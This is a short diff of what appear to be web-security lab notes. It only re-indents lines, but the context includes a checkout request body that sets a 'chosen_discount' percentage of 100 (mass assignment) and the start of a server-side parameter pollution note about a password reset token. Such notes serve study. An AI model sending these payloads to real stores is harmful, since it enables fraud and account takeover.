@@ -1579,7 +1579,7 @@ CONNECT
      `{"chosen_discount":{"percentage":0},"chosen_products":[]}`
   - in POST /api/checkout, append the "chosen_discount" properties and set percentage to 100
     ```
-   {
+    {
     "chosen_discount":{
         "percentage":100
     },
@@ -1589,8 +1589,8 @@ CONNECT
             "quantity":1
         }
      ]
-   }
-   ```
+    }
+    ```
 5. Exploiting **server-side parameter pollution** in a REST URL
    - **Discover urls** > review /static/js/forgotPassword.js   
      /forgot-password?**passwordResetToken**=${resetToken}
